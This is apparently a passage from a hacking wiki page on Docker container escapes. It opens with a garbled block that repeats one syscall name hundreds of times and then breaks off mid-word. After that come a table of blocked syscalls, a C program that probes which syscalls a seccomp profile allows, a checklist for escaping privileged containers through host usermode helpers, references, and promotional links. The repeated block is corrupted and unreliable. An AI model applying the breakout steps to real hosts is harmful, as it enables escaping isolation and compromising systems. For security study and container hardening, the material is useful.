- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched_getaffinity`
- `sys_sched
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% tab title="syscall_bf.c" %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
